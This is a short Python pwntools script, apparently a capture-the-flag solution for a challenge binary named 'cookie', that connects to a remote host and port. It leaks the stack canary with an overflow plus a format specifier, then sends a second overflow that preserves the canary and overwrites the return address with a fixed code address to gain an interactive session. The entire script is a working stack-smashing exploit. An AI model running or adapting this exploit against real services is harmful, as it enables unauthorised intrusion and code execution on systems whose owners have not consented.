from pwn import *

context(arch='amd64', os='linux')

#io = process('./cookie')

io = remote('34.159.190.67', 32105)

msg = io.recvline(b'Hello Hacker!\n')

payload = 0x66 * b'A' + b'%s'

print(payload)

io.sendline(payload)

msg = io.recvline()

msg = io.recv(7)

print(msg)

canary = unpack(b'\x00' + msg, 'all', endian='little', sign=False)

print(hex(canary))

payload = 0x68 * b'A' + p64(canary) + 0x8 * b'A' + p64(0x400738)

io.sendline(payload)

io.interactive()
